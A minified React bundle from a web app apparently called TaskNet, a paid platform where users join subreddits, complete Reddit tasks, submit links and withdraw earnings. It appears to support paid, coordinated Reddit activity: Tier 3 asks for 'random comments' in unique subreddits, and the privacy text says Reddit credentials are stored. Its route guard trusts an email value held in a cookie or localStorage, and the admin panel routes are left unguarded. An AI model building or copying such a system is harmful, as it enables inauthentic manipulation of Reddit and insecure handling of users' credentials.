mb-16",children:[n.jsxs("div",{className:"lg:col-span-2 space-y-8",children:[n.jsx("h2",{className:"text-xl font-black uppercase italic tracking-tighter",children:"Instructions"}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"flex gap-6 items-start group",children:[n.jsx("div",{className:"w-10 h-10 bg-emerald-500 text-black font-black flex items-center justify-center rounded-xl shrink-0 text-xl shadow-lg shadow-emerald-500/20",children:"1"}),n.jsxs("div",{className:"pt-1",children:[n.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[n.jsx("span",{className:"text-sm font-black text-blue-500 uppercase tracking-widest",children:"Step 1"}),n.jsx("div",{className:"h-[1px] w-12 bg-white/10"}),n.jsxs("span",{className:"text-xs font-bold text-gray-500 flex items-center gap-2 italic",children:[n.jsx(Mr,{size:12})," r/",r.subreddit||"Reddit"]})]}),n.jsx("h3",{className:"text-xl font-bold text-white mb-2",children:"Join the Subreddit First"}),n.jsx("p",{className:"text-sm text-gray-500 mb-4 max-w-lg",children:"Go to the target subreddit and make sure you are joined before participating."}),n.jsxs("a",{href:r.reddit_url,target:"_blank",rel:"noreferrer",className:"inline-flex items-center gap-2 px-4 py-2 bg-[#FF4500] text-white rounded-xl text-xs font-black uppercase tracking-widest hover:bg-[#ff5722] transition-all shadow-lg shadow-[#FF4500]/20",children:["Go to Subreddit ",n.jsx(pa,{size:14})]})]})]}),n.jsxs("div",{className:"flex gap-6 items-start group",children:[n.jsx("div",{className:"w-10 h-10 bg-blue-600 text-white font-black flex items-center justify-center rounded-xl shrink-0 text-xl shadow-lg shadow-blue-600/20",children:"2"}),n.jsxs("div",{className:"pt-1 w-full",children:[n.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[n.jsx("span",{className:"text-sm font-black text-blue-500 uppercase tracking-widest",children:"Step 2"}),n.jsx("div",{className:"h-[1px] w-12 bg-white/10"}),n.jsx("span",{className:"text-xs font-bold text-gray-500 italic",children:"Participation"})]}),n.jsx("h3",{className:"text-xl font-bold text-white mb-2",children:"Complete the Task"}),n.jsx("div",{className:"p-4 bg-white/[0.03] border border-white/5 rounded-2xl text-sm text-gray-400 leading-relaxed mb-6 whitespace-pre-line max-w-lg",children:r.instructions}),n.jsxs("div",{className:"space-y-6 max-w-lg",children:[n.jsxs("div",{children:[n.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-widest mb-3 ml-1",children:"Main Task Submission Link"}),n.jsxs("div",{className:"relative group",children:[n.jsx(ui,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 group-focus-within:text-blue-500 transition-colors",size:16}),n.jsx("input",{type:"url",placeholder:"https://www.reddit.com/r/...",value:h,onChange:J=>p(J.target.value),className:"w-full pl-12 pr-4 py-4 bg-[#0a0a0a] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm outline-none shadow-inner"})]})]}),r.tier==="Tier 3"&&n.jsxs("div",{className:"space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500",children:[n.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-widest mb-3 ml-1",children:"Random Comments (Must be unique subreddits)"}),x.map((J,B)=>n.jsxs("div",{className:"relative group",children:[n.jsx("div",{className:"absolute left-4 top-1/2 -translate-y-1/2 text-xs font-black text-gray-700 group-focus-within:text-blue-500 transition-colors w-4",children:B+1}),n.jsx("input",{type:"url",placeholder:`Random comment link ${B+1}...`,value:J,onChange:ie=>{const ne=[...x];ne[B]=ie.target.value,v(ne)},className:"w-full pl-12 pr-4 py-3.5 bg-[#0a0a0a] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-xs outline-none shadow-inner"})]},B))]}),n.jsxs("div",{className:"pt-4",children:[n.jsxs("div",{className:"flex items-center gap-3 p-4 bg-orange-500/5 border border-orange-500/10 rounded-2xl mb-4",children:[n.jsx(Ee,{size:16,className:"text-orange-500 shrink-0"}),n.jsx("p",{className:"text-[10px] font-bold text-orange-500/80 uppercase tracking-wider",children:"Please double check before submitting the link"})]}),r.status==="claimed"?n.jsx("button",{onClick:fe,disabled:l,className:"w-full py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/20 flex items-center justify-center gap-2 group disabled:opacity-50",children:l?"Submitting...":n.jsxs(n.Fragment,{children:["Submit Completed Task",n.jsx(un,{size:18,className:"group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform"})]})}):n.jsx("div",{className:"p-4 bg-white/[0.03] border border-white/5 rounded-2xl text-center",children:n.jsxs("span",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest",children:["Submission Locked (",r.status.toUpperCase(),")"]})})]})]})]})]})]})]}),n.jsx("div",{className:"lg:col-span-1",children:n.jsxs("div",{className:"sticky top-28 space-y-6",children:[n.jsxs("div",{className:"p-8 bg-white/[0.02] border border-white/5 rounded-[32px] animate-in fade-in slide-in-from-right-4 duration-700",children:[n.jsxs("div",{className:"flex items-center gap-4 mb-6",children:[n.jsx("div",{className:"w-12 h-12 bg-red-500/10 rounded-2xl flex items-center justify-center border border-red-500/20",children:n.jsx(Ee,{className:"text-red-500",size:24})}),n.jsxs("div",{children:[n.jsx("h3",{className:"text-sm font-black uppercase tracking-wider text-white",children:"Report Problem"}),n.jsx("p",{className:"text-[10px] font-bold text-gray-500 uppercase tracking-widest",children:"Contact Administration"})]})]}),n.jsxs("div",{className:"space-y-4",children:[n.jsx("p",{className:"text-xs text-gray-500 leading-relaxed italic",children:"Disclaimer: Reporting fake issues or spamming this box will lead to a temporary account suspension."}),n.jsx("textarea",{rows:4,placeholder:"Note down your problem here...",value:j,onChange:J=>y(J.target.value),className:"w-full px-5 py-4 bg-black/40 border border-white/5 rounded-2xl focus:outline-none focus:border-red-500/50 transition-all text-xs placeholder:text-gray-600 resize-none outline-none"}),n.jsxs("button",{onClick:G,disabled:!j.trim()||m,className:"w-full py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-xs hover:text-white hover:bg-white/5 transition-all flex items-center justify-center gap-2 group disabled:opacity-50",children:[m?"Sending...":"Send Report",!m&&n.jsx(un,{size:14,className:"group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform"})]})]})]}),n.jsxs("div",{className:"p-6 bg-blue-600/5 border border-blue-600/10 rounded-[32px] text-center",children:[n.jsx("p",{className:"text-[10px] font-black text-blue-500/60 uppercase tracking-[0.2em] mb-2",children:"Need Live Support?"}),n.jsx("a",{href:"https://discord.gg/ND296AgTyc",target:"_blank",rel:"noreferrer",className:"text-xs font-bold text-white hover:text-blue-400 transition-colors",children:"Join our Discord Community"})]})]})})]})]}),k&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[40px] p-8 sm:p-10 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex flex-col items-center text-center mb-8",children:[n.jsx("div",{className:"w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center mb-6 border border-blue-500/20",children:n.jsx(Mr,{className:"text-blue-500",size:32})}),n.jsx("h2",{className:"text-2xl font-black tracking-tight mb-2 uppercase italic",children:"Confirm Submission"}),n.jsx("p",{className:"text-gray-500 text-sm",children:"Do you want to proceed with the task submission? This action cannot be undone."})]}),n.jsxs("div",{className:"flex gap-4",children:[n.jsx("button",{onClick:()=>C(!1),className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"No, Back"}),n.jsx("button",{onClick:se,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]",children:"Yes, Submit"})]})]})})]})}):n.jsx("div",{className:"min-h-screen bg-black flex items-center justify-center text-red-500 font-bold",children:"Task not found."})},Qw=()=>{const e=St();return n.jsx("div",{className:"min-h-screen bg-black text-white p-6 sm:p-12",children:n.jsxs("div",{className:"max-w-4xl mx-auto",children:[n.jsxs("button",{onClick:()=>e(-1),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-12 group",children:[n.jsx(Li,{size:20,className:"group-hover:-translate-x-1 transition-transform"}),n.jsx("span",{className:"font-bold uppercase tracking-widest text-xs",children:"Go Back"})]}),n.jsxs("div",{className:"space-y-12",children:[n.jsxs("header",{className:"space-y-4",children:[n.jsx("h1",{className:"text-4xl sm:text-6xl font-black tracking-tighter",children:"PRIVACY POLICY"}),n.jsx("p",{className:"text-gray-500 font-medium",children:"Last Updated: January 21, 2026"})]}),n.jsxs("section",{className:"grid grid-cols-1 md:grid-cols-2 gap-8",children:[n.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[n.jsx("div",{className:"w-12 h-12 bg-blue-600/20 rounded-2xl flex items-center justify-center text-blue-500",children:n.jsx(oc,{size:24})}),n.jsx("h3",{className:"text-xl font-bold",children:"Data Protection"}),n.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"We take your data security seriously. All personal information and Reddit credentials are encrypted and stored securely within our infrastructure."})]}),n.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[n.jsx("div",{className:"w-12 h-12 bg-purple-600/20 rounded-2xl flex items-center justify-center text-purple-500",children:n.jsx($t,{size:24})}),n.jsx("h3",{className:"text-xl font-bold",children:"Authentication"}),n.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"TaskNet uses secure authentication protocols. Your passwords and login details are never shared with third parties or stored in plain text."})]})]}),n.jsxs("div",{className:"space-y-8 text-gray-400 leading-relaxed",children:[n.jsxs("div",{className:"space-y-4",children:[n.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[n.jsx(bu,{className:"text-blue-500"})," Information We Collect"]}),n.jsx("p",{children:"To provide our services, we collect minimal necessary information: email addresses for account management, Reddit usernames for task verification, and payout details for earnings distribution."})]}),n.jsxs("div",{className:"space-y-4",children:[n.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[n.jsx(lc,{className:"text-blue-500"})," How We Use Data"]}),n.jsx("p",{children:"Your data is used exclusively for:"}),n.jsxs("ul",{className:"list-disc pl-6 space-y-2",children:[n.jsx("li",{children:"Verifying task completion on social platforms."}),n.jsx("li",{children:"Processing withdrawal requests and tracking earnings."}),n.jsx("li",{children:"Sending important administrative alerts regarding your account."}),n.jsx("li",{children:"Preventing fraud and maintaining network integrity."})]})]})]}),n.jsx("footer",{className:"pt-12 border-t border-white/5",children:n.jsx("p",{className:"text-center text-gray-600 text-xs font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  ALL RIGHTS RESERVED"})})]})]})})},Xw=()=>{const e=St();return n.jsx("div",{className:"min-h-screen bg-black text-white p-6 sm:p-12",children:n.jsxs("div",{className:"max-w-4xl mx-auto",children:[n.jsxs("button",{onClick:()=>e(-1),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all mb-12 group",children:[n.jsx(Li,{size:20,className:"group-hover:-translate-x-1 transition-transform"}),n.jsx("span",{className:"font-bold uppercase tracking-widest text-xs",children:"Go Back"})]}),n.jsxs("div",{className:"space-y-12",children:[n.jsxs("header",{className:"space-y-4",children:[n.jsx("h1",{className:"text-4xl sm:text-6xl font-black tracking-tighter uppercase",children:"TERMS & CONDITIONS"}),n.jsx("p",{className:"text-gray-500 font-medium",children:"Effective Date: January 21, 2026"})]}),n.jsxs("section",{className:"grid grid-cols-1 md:grid-cols-2 gap-8",children:[n.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[n.jsx("div",{className:"w-12 h-12 bg-emerald-600/20 rounded-2xl flex items-center justify-center text-emerald-500",children:n.jsx(Gg,{size:24})}),n.jsx("h3",{className:"text-xl font-bold",children:"User Eligibility"}),n.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"You must be at least 13 years old or the legal age of majority in your jurisdiction to use TaskNet and participate in social tasking."})]}),n.jsxs("div",{className:"p-8 bg-white/[0.03] border border-white/10 rounded-[32px] space-y-4",children:[n.jsx("div",{className:"w-12 h-12 bg-amber-600/20 rounded-2xl flex items-center justify-center text-amber-500",children:n.jsx(Hg,{size:24})}),n.jsx("h3",{className:"text-xl font-bold",children:"Prohibited Conduct"}),n.jsx("p",{className:"text-gray-400 text-sm leading-relaxed",children:"Fraudulent activity, multi-accounting, and botting are strictly prohibited. Violators will face permanent network bans and forfeiture of earnings."})]})]}),n.jsxs("div",{className:"space-y-8 text-gray-400 leading-relaxed",children:[n.jsxs("div",{className:"space-y-4",children:[n.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[n.jsx(ty,{className:"text-blue-500"})," Service Agreement"]}),n.jsx("p",{children:"By accessing TaskNet, you agree to comply with our network rules and verification processes. We provide a platform connecting task posters with participants but do not guarantee specific earning amounts."})]}),n.jsxs("div",{className:"space-y-4",children:[n.jsxs("h2",{className:"text-2xl font-bold text-white flex items-center gap-3",children:[n.jsx(Jg,{className:"text-blue-500"})," Withdrawal Policy"]}),n.jsx("p",{children:"Earnings are distributed after verification. Processing times vary by payout method. We reserve the right to audit accounts before finalizing large withdrawals to ensure compliance."})]})]}),n.jsx("footer",{className:"pt-12 border-t border-white/5",children:n.jsx("p",{className:"text-center text-gray-600 text-xs font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  TERMS OF SERVICE"})})]})]})})},On=({children:e})=>{const t=ft("user_email")||localStorage.getItem("user_email");return t&&Dw("user_email"),t?n.jsx(n.Fragment,{children:e}):n.jsx(vu,{to:"/welcome",replace:!0})};function Zw(){return n.jsx(Lg,{children:n.jsxs(Tg,{children:[n.jsx(tt,{path:"/welcome",element:n.jsx(Mw,{})}),n.jsx(tt,{path:"/login",element:n.jsx(Hw,{})}),n.jsx(tt,{path:"/reddit-login",element:n.jsx(Kw,{})}),n.jsx(tt,{path:"/privacy",element:n.jsx(Qw,{})}),n.jsx(tt,{path:"/terms",element:n.jsx(Xw,{})}),n.jsx(tt,{path:"/adminpanel_1",element:n.jsx(Gw,{})}),n.jsx(tt,{path:"/adminpanel_2",element:n.jsx(Jw,{})}),n.jsx(tt,{path:"/",element:n.jsx(On,{children:n.jsx(Bw,{})})}),n.jsx(tt,{path:"/tasks",element:n.jsx(On,{children:n.jsx(Ww,{})})}),n.jsx(tt,{path:"/task/:id",element:n.jsx(On,{children:n.jsx(Yw,{})})}),n.jsx(tt,{path:"/withdraw",element:n.jsx(On,{children:n.jsx(Vw,{})})}),n.jsx(tt,{path:"/account",element:n.jsx(On,{children:n.jsx(qw,{})})}),n.jsx(tt,{path:"*",element:n.jsx(vu,{to:"/",replace:!0})})]})})}co.createRoot(document.getElementById("root")).render(n.jsx(Nc.StrictMode,{children:n.jsx(Zw,{})}));
